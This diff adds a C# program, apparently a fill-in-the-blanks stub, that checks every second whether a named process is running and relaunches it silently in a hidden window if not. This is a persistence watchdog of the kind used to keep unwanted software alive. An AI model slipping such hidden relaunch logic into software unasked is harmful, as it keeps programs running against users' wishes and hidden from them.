@@ -1,0 +1,71 @@
+﻿using Microsoft.VisualBasic;
+using Microsoft.VisualBasic.CompilerServices;
+using System;
+using System.Diagnostics;
+using System.Management;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace Kronos
+{
+    class Program
+    {
+
+        [STAThread]
+        public static void Main()
+        {
+
+            StartmyZed();
+            System.Timers.Timer timer = new System.Timers.Timer(1000);
+            timer.Elapsed += Timer_Elapsed;
+            timer.Start();
+            while (true)
+            {
+
+            }
+
+        }
+        private static void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
+        {
+            System.Diagnostics.Process[] proc = System.Diagnostics.Process.GetProcessesByName("%NAME%");
+            if (proc.Length > 0)
+            {
+
+            }
+            else
+            {
+                 StartmyZed();  
+            }
+
+        }
+
+
+
+        public static void StartmyZed()
+        {
+
+            try
+            {
+                if (Information.UBound(Process.GetProcessesByName("%NAME%")) < 0)
+                {
+                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
+                    processStartInfo.FileName = @"%PATH%";
+                    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process.Start(processStartInfo);
+                    //Process.GetCurrentProcess().Kill();
+                    //Application.Exit();
+                }
+            }
+            catch (Exception projectError)
+            {
+                ProjectData.SetProjectError(projectError);
+                ProjectData.ClearProjectError();
+            }
+
+
+        }
+
+
+    }
+}
+
